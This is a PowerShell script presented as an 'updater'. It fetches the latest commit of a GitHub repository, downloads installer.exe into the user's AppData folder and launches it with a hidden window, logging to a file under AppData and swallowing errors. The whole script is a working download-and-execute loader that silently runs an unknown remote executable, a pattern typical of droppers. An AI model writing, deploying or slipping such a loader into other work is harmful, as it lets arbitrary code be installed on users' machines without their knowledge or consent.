$logFile = "$env:APPDATA\Microsoft\run\updater.log"
function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

$p = "$env:APPDATA\run"
if (!(Test-Path $p)) {
  New-Item -ItemType Directory -Path $p | Out-Null
}

try {
  Log-Msg "[INFO] Starting updater..."
  $headers = @{ "User-Agent" = "PowerShell-Updater" }
  $sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main' -Headers $headers -UseBasicParsing).sha
  Log-Msg "[INFO] Latest commit sha: $sha"
  $o = "$p\installer.exe"

  Stop-Process -Name "installer" -ErrorAction SilentlyContinue

  Log-Msg "[INFO] Downloading installer.exe..."
  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$sha/installer.exe" -OutFile $o -Headers $headers -UseBasicParsing
  Log-Msg "[INFO] Starting installer.exe..."
  Start-Process -FilePath $o -WindowStyle Hidden
  Log-Msg "[INFO] Installer started successfully."
}
catch {
  Log-Msg "[ERROR] Updater failed: $($_.Exception.ToString())"
}

